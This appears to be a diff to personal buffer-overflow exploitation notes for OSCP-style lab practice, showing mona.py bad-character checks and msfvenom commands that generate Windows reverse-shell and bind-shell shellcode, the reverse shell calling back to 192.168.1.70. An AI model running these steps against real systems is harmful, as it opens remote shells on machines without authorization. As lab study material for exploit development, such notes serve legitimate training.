@@ -10,7 +10,9 @@
 
 !mona bytearray -b "\x00"
 
-!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address> # Note : at 1st include 00 as bad char then run all the hex values to find bad chars after running then again run same command and also change esp values everytime you run the exploit.
+#Note: Check FolderName
+
+!mona compare -f C:\mona\%FOLDERNAME%\bytearray.bin -a <ESP address> # Note : at 1st include 00 as bad char then run all the hex values to find bad chars after running then again run same command and also change esp values everytime you run the exploit.
 
 # Finding the jump point with the bad chars we have found while identifying bad chars
 
@@ -19,3 +21,4 @@
 # Creating exploits
 
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.70 lport=445 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+msfvenom -p windows/shell_bind_tcp lhost=eth0 lport=1337 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
